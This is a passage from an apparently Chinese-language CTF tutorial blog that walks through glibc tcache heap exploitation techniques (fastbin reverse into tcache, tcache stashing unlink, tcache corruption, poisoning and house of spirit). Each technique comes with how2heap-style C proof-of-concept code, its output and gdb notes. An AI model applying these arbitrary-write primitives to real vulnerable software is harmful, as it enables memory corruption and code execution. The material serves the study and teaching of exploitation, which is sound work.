class="comment">// 填满fastbin</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">8</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在栈上创建数组并填充垃圾数据</span></span><br><span class="line">    <span class="type">size_t</span> stack_var[<span class="number">6</span>];</span><br><span class="line">    <span class="built_in">memset</span>(stack_var, <span class="number">0xcd</span>, <span class="keyword">sizeof</span>(stack_var)); <span class="comment">// 填充数据为0xcd</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">&quot;我们想要攻击的栈地址：%p\n&quot;</span></span><br><span class="line">        <span class="string">&quot;当前值为：%p\n&quot;</span>,</span><br><span class="line">        &amp;stack_var[<span class="number">2</span>],</span><br><span class="line">        (<span class="type">char</span>*)stack_var[<span class="number">2</span>]</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">&quot;现在我们利用缓冲区溢出或use-after-free等漏洞\n&quot;</span></span><br><span class="line">        <span class="string">&quot;来覆盖位于%p处的next指针\n\n&quot;</span>,</span><br><span class="line">        victim</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ------------漏洞利用部分-----------</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 覆盖victim中的链表指针</span></span><br><span class="line">    *(<span class="type">size_t</span>**)victim = &amp;stack_var[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;下一步通过7次malloc(allocsize)清空tcache\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清空tcache</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">        ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;现在打印栈数组内容以展示尚未被修改的状态：\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="type">char</span>*)stack_var[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">&quot;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;下一次内存分配将触发栈数据覆盖。tcache已空，但fastbin还有内容，\n&quot;</span></span><br><span class="line">        <span class="string">&quot;因此下一个分配来自fastbin。同时会用fastbin中的7个chunk重新填充tcache。\n&quot;</span></span><br><span class="line">        <span class="string">&quot;这7个chunk会以逆序复制到tcache，因此目标栈地址最终会成为tcache中的第一个chunk。\n&quot;</span></span><br><span class="line">        <span class="string">&quot;它包含指向链表中下一个chunk的指针，这就是为什么堆指针会被写入栈。\n&quot;</span></span><br><span class="line">        <span class="string">&quot;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;先前提到如果栈上值为零，释放少于6次也可以工作，\n&quot;</span></span><br><span class="line">        <span class="string">&quot;因为栈上的值会被视为链表next指针，若非有效指针或null会导致崩溃。\n&quot;</span></span><br><span class="line">        <span class="string">&quot;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;现在栈数组的内容如下：\n\n&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(allocsize); <span class="comment">// 触发栈数据覆盖</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="type">char</span>*)stack_var[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *q = <span class="built_in">malloc</span>(allocsize); <span class="comment">// 再次分配内存</span></span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">&quot;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;最后，再次调用malloc会得到栈地址：%p\n&quot;</span>,</span><br><span class="line">        q</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    assert(q == (<span class="type">char</span> *)&amp;stack_var[<span class="number">2</span>]); <span class="comment">// Assert 断言</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ubuntu20.04 , gcc -o fastbin_reverse_into_tcache fastbin_reverse_into_tcache.c  -g</p>
<p>结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ctf@d2ad36c17601:~/pwn$ ./fastbin_reverse_into_tcache</span><br><span class="line"></span><br><span class="line">本攻击效果类似于unsorted_bin_attack，但适用于小内存分配（allocsize &lt;= 0x78）。</span><br><span class="line">目标是构造特定条件使得调用malloc(allocsize)时会将一个超大无符号值写入栈。</span><br><span class="line"></span><br><span class="line">首先我们需要至少free释放7次来填满tcache。</span><br><span class="line">（超过7次也可以正常工作）</span><br><span class="line"></span><br><span class="line">接下来要释放的指针是我们要篡改的chunk：0x56131b5de4d0</span><br><span class="line">现在或稍后篡改都可以。因为tcache已满，它会被放入fastbin。</span><br><span class="line"></span><br><span class="line">接下来需要再释放1到6个指针。这些也会进入fastbin。</span><br><span class="line">如果我们要覆盖的栈地址值不是零，则需要精确释放6次，否则会导致段错误。</span><br><span class="line">但如果栈上的值是零，则只需要释放1次。</span><br><span class="line"></span><br><span class="line">我们想要攻击的栈地址：0x7ffff3b70d20</span><br><span class="line">当前值为：0xcdcdcdcdcdcdcdcd</span><br><span class="line">现在我们利用缓冲区溢出或use-after-free等漏洞</span><br><span class="line">来覆盖位于0x56131b5de4d0处的next指针</span><br><span class="line"></span><br><span class="line">下一步通过7次malloc(allocsize)清空tcache</span><br><span class="line"></span><br><span class="line">现在打印栈数组内容以展示尚未被修改的状态：</span><br><span class="line"></span><br><span class="line">0x7ffff3b70d10: 0xcdcdcdcdcdcdcdcd</span><br><span class="line">0x7ffff3b70d18: 0xcdcdcdcdcdcdcdcd</span><br><span class="line">0x7ffff3b70d20: 0xcdcdcdcdcdcdcdcd</span><br><span class="line">0x7ffff3b70d28: 0xcdcdcdcdcdcdcdcd</span><br><span class="line">0x7ffff3b70d30: 0xcdcdcdcdcdcdcdcd</span><br><span class="line">0x7ffff3b70d38: 0xcdcdcdcdcdcdcdcd</span><br><span class="line"></span><br><span class="line">下一次内存分配将触发栈数据覆盖。tcache已空，但fastbin还有内容，</span><br><span class="line">因此下一个分配来自fastbin。同时会用fastbin中的7个chunk重新填充tcache。</span><br><span class="line">这7个chunk会以逆序复制到tcache，因此目标栈地址最终会成为tcache中的第一个chunk。</span><br><span class="line">它包含指向链表中下一个chunk的指针，这就是为什么堆指针会被写入栈。</span><br><span class="line"></span><br><span class="line">先前提到如果栈上值为零，释放少于6次也可以工作，</span><br><span class="line">因为栈上的值会被视为链表next指针，若非有效指针或null会导致崩溃。</span><br><span class="line"></span><br><span class="line">现在栈数组的内容如下：</span><br><span class="line"></span><br><span class="line">0x7ffff3b70d10: 0xcdcdcdcdcdcdcdcd</span><br><span class="line">0x7ffff3b70d18: 0xcdcdcdcdcdcdcdcd</span><br><span class="line">0x7ffff3b70d20: 0x56131b5de4d0</span><br><span class="line">0x7ffff3b70d28: 0x56131b5de010</span><br><span class="line">0x7ffff3b70d30: 0xcdcdcdcdcdcdcdcd</span><br><span class="line">0x7ffff3b70d38: 0xcdcdcdcdcdcdcdcd</span><br><span class="line"></span><br><span class="line">最后，再次调用malloc会得到栈地址：0x7ffff3b70d20</span><br></pre></td></tr></table></figure>

<h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p>我们知道当同一个size的chunk在tcachebins中满7个时，就会填入fasbins，而当tcachebins中的chunk被申请完了，系统会将fastbins中同样size逆序放入到tcachebins</p>
<p>首先，创建了14个chunk填满了tcache_bins，fastbins</p>
<p>然后，通过 UAF 或 堆溢出 修改fastbins中第一个放入的chunk(victim)的fd指针指向栈地址(实战中可以为任意可写地址，比如got表可写的__free_hook-0x10)</p>
<p>最后，申请出7个tcachebins，再申请一个即可触发 fastbin_reverse_into_tcache，然后第一个放入fastbins的chunk(victim)就会出现在tcachebins的头部，申请出即可</p>
<h3 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache_stashing_unlink_attack"></a>tcache_stashing_unlink_attack</h3><p>攻击成效：向任意地址写堆地址或分配任意地址</p>
<p>攻击前提：</p>
<ul>
<li>能够控制 Small Bin chunk的bk指针</li>
<li>程序可以越过Tache取chunk。（calloc可以做到）</li>
<li>程序可以分配两种不同大小且属于Unsorted Bin的chunk</li>
</ul>
<p>参考链接：<a href="https://blog.csdn.net/qq_41252520/article/details/126198171">https://blog.csdn.net/qq_41252520/article/details/126198171</a></p>
<p>how2heap ;2.31</p>
<p>主要利用的是small bin链表中摘堆块后重新排列进tcache的原理</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *target;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;本文件演示针对tcache的stashing unlink攻击。\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;该PoC已在glibc-2.27、glibc-2.29和glibc-2.31测试通过。\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;当你能覆盖victim-&gt;bk指针时可以使用此技术。此外，需要至少使用calloc分配一次内存。最后，我们需要一个可写地址来绕过glibc的检查。\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;glibc将smallbin放入tcache的机制为我们提供了攻击机会。\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;此技术允许我们向任意地址写入libc地址，并在需要处创建伪造chunk。本例将在栈上创建伪造chunk。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// stack_var模拟我们要分配到的伪造chunk</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;stack_var模拟我们想要分配到的伪造chunk。\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;首先向fake_chunk-&gt;bk写入可写地址以绕过glibc中的bck-&gt;fd = bin检查。这里选择stack_var[2]的地址作为伪造bk。稍后可以看到*(fake_chunk-&gt;bk + 0x10)即stack_var[4]将在攻击后变为libc地址。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;可以看到fake_chunk-&gt;bk的值为：%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;同时查看stack_var[4]的初始值：%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;现在分配9个malloc chunk。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 分配9个chunk</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="type">unsigned</span> <span class="type">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将7个chunk放入tcache</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;随后释放其中7个chunk到tcache。注意没有连续释放chunk2到chunk9，因为相邻的unsorted bin会在后续malloc时合并。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;可以看到，chunk1及[chunk3,chunk8]被放入tcache，而chunk0和chunk2将进入unsorted bin。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 最后一个tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">// 现在放入unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 转换为small bin</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;现在分配大于0x90的chunk使chunk0和chunk2进入small bin。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>); <span class="comment">// 大小 &gt; 0x90</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 现在有5个tcache bin</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;接着分配两个chunk腾出空间，现在有5个tcache bin和2个small bin。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;现在模拟可以覆盖victim-&gt;bk指针指向伪造chunk地址的漏洞：%p。\n\n&quot;</span>,(<span class="type">void</span>*)stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修改victim-&gt;bk</span></span><br><span class="line">    <span class="comment">/* 漏洞点 */</span></span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/* 漏洞点 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 触发攻击</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;最后用calloc分配0x90的chunk触发攻击。之前释放的small bin将被返回，另一个chunk和伪造chunk被链接到tcache。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;现在伪造chunk已被放入tcache bin[0xa0]链表。其fd指针指向下一个空闲chunk：%p，且bck-&gt;fd已被修改为libc地址：%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">2</span>],(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 分配并获取栈上的伪造chunk</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;可以看到，下一次malloc(0x90)将返回我们伪造的chunk区域：%p\n&quot;</span>,(<span class="type">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h4><ol>
<li>申请 9 个 chunk，然后先释放chunk3 - chunk8 和chunk1，他们会被放入 tcache bin中。然后再释放 chunk0 和 chunk2，会被放入 unsortedbin中（连着释放7个会被合并）；</li>
<li>随后申请一个 大于 上述 chunk size (0x90)的chunk，那么此时所有 的 空闲chunk都不合适，并且 unsortedbin 中的chunk0 和 chunk2 会被放入 small bin中；</li>
<li>申请两个 tcache，此时 tcache 中的 剩余 chunk数量 为 5 个；</li>
<li><strong>修改 chunk 2 的 bk指针 指向我们伪造的 内存的地址 chunk，<u>该内存地址的chunk 的 bk 指针要为一个 可写入的地址</u>；</strong></li>
<li>随后调用 calloc() 申请 与tcache 同大小的 chunk，由于 calloc() 函数会跳过 tcache，所以其会直接从 small bin中 取 chunk0；</li>
<li>此时，同上述的 fastbin_reverse_into_tcache 类似的结果，small bin 中剩余的 chunk2-&gt; fake chunk，会从后向前 加入 tcache中，而且由于此时tcache 仅剩2个空余，所以只会遍历到 fake chunk就会结束。</li>
<li>经过上述操作后，此时 tcache链中 第一个 chunk 是 fake chunk，我们取出即可。</li>
</ol>
<h3 id="tcache-corruption"><a href="#tcache-corruption" class="headerlink" title="tcache_corruption"></a>tcache_corruption</h3><p>这段代码演示了控制tcache_perthread_struct的chunk，修改next指针（目前的tcache并没有检查next指向的chunk的size是否合法，所以直接伪造next指针为想要修改的地址就好了）实现任意地址写</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TCACHE_MAX_BINS 64</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">    tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> global_buf[<span class="number">0x100</span>] = <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> *ptr, *controlled_buf;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> temp;</span><br><span class="line">    tcache_perthread_struct *fake;</span><br><span class="line"><span class="comment">//申请一个 chunk 为泄露 tcache_perthread_struct 的 chunk</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;global_buf: %s\n&quot;</span>, global_buf);</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">0x68</span>);</span><br><span class="line">    temp = (<span class="type">long</span> <span class="type">long</span>)ptr;</span><br><span class="line"><span class="comment">//计算出 tcache_perthread_struct 的 chunk_mem_ptr, 首先要能泄露一个堆地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;temp: %llx\n&quot;</span>, temp);</span><br><span class="line">    temp = temp &amp; (~<span class="number">0xfff</span>);</span><br><span class="line">    temp += <span class="number">0x10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;temp: %llx\n&quot;</span>, temp);</span><br><span class="line"><span class="comment">//向 tcache_perthread_struct 的 chunk 中写入一个地址，他就会出现在 tcache 中，将其申请出来就得到了一个可写的chunk</span></span><br><span class="line">    fake = (tcache_perthread_struct *)temp;</span><br><span class="line">    fake-&gt;entries[<span class="number">5</span>] = (tcache_entry *)global_buf;</span><br><span class="line"><span class="comment">//申请出那块可写的 chunk(内存)，进行写入</span></span><br><span class="line">    controlled_buf = <span class="built_in">malloc</span>(<span class="number">0x68</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(controlled_buf, <span class="string">&quot;Tcache Corruption&quot;</span>, <span class="number">18</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;global_buf: %s\n&quot;</span>, global_buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>gdb调试：</p>
<ul>
<li><code>b 25</code>，查看 ptr </li>
<li><code>b 30</code>，查看temp，它是 tcache_perthread_struct 的 chunk_mem_ptr</li>
<li><code>b 33</code>，在这行代码处查看 global_buf 的内容，此时为 hello world</li>
<li><code>b 37</code>，再次查看 global_buf 的内容</li>
</ul>
<p>运行结果：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ctf@1a3f037ee8c1:~/pwn$ ./demo</span><br><span class="line">global_buf: hello world</span><br><span class="line">temp: 555555602670</span><br><span class="line">temp: 555555602010</span><br><span class="line">global_buf: Tcache Corruption</span><br></pre></td></tr></table></figure>

<h4 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h4><h3 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h3><p>来源：how2heap</p>
<p>此demo的效果就是返回一个指向任意地址的指针，与fastbin corruption攻击极其相似（本例返回的地址是一个栈地址）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="type">size_t</span> stack_var;</span><br><span class="line">    <span class="comment">//我们想要返回的地址是stack_var</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;定义了一个变量 stack_var，我们想让程序 malloc 到这里 %p.\n&quot;</span>, (<span class="type">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;接下来申请两个 chunk\n&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk a 在: %p\n&quot;</span>, a);</span><br><span class="line">    <span class="type">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk b 在: %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;free 掉这两个 chunk\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;现在 tcache 那个链表是这样的 [ %p -&gt; %p ].\n&quot;</span>, b, a);</span><br><span class="line">    <span class="comment">//我们通过覆写第一个chunk的fd指针，使其指向我们的栈地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;我们把 %p 的前 %lu 字节（也就是 fd/next 指针）改成 stack_var 的地址：%p&quot;</span>, b, <span class="keyword">sizeof</span>(<span class="type">intptr_t</span>), &amp;stack_var);</span><br><span class="line">    b[<span class="number">0</span>] = (<span class="type">intptr_t</span>)&amp;stack_var;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;现在 tcache 链表是这样的 [ %p -&gt; %p ].\n&quot;</span>, b, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;然后一次 malloc : %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;现在 tcache 链表是这样的 [ %p ].\n&quot;</span>, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="type">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;第二次 malloc: %p\n&quot;</span>, c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ojbk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>b 17</code>，此时申请了两个chunk，一个应该是为了防止合并到Top_chunk，另一个是要攻击的chunk，也就是b。</li>
<li><code>b 22</code>，此时两个chunk已经进入到tcache中。</li>
<li><code>b 27</code>，这里修改了b[0]的位置，也就是chunk b的next指针，此时bins中应为：<code>b -&gt; &amp;stack_var</code></li>
<li><code>b 30</code>，这里申请了一个chunk，此时bins中应为：<code>&amp;stack_var</code></li>
<li><code>b 33</code>，这里很明显就是申请出了&amp;stack_var作为chunk</li>
</ul>
<blockquote>
<p>原因：在glibc 2.27中没有像fastbin中那样检查free_chunk的size域</p>
</blockquote>
<h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><p>对于tcache poisoning来说，我们的利用极其简单</p>
<p>只需要free掉一个chunk放入tcache中，然后直接更改其fd指针，我们就可以任意地址malloc了</p>
<p>程序首先在栈上声明了一个变量，之后malloc了chunk a(size&#x3D;128),此时free掉chunk a,a被链入到free list中</p>
<p>然后程序覆写了a的fd指针，将其指向了我们的栈指针</p>
<p>现在栈指针也被链入了我们的free list中</p>
<p>此时我们再malloc，因为不会检查size是否合法，就可以直接将我们的栈指针取出来了(先进后出</p>
<h3 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache_house_of_spirit"></a>tcache_house_of_spirit</h3><p>tcache_house_of_spirit就是通过free一个Fake chunk来让malloc返回一个指向几乎任意地址的指针</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *a;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fake_chunks[<span class="number">10</span>];</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fake_chunks[1] 在 %p\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fake_chunks[1] 改成 0x40 \n&quot;</span>);</span><br><span class="line">    fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;把 fake_chunks[2] 的地址赋给 a, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">    a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;free 掉 a\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;再去 malloc(0x30)，在可以看到申请来的结果在: %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ojbk\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要点：</p>
<ul>
<li>观察fake_chunks[]数组变化</li>
<li>free(a)，<code>a = &amp;fake_chunks[2];</code>原因：tcache中存放的是chunk_mem_ptr，fake_chunks[0]是prev_size域，fake_chunk[1]是size域</li>
<li>在free(a)后的bins：</li>
</ul>
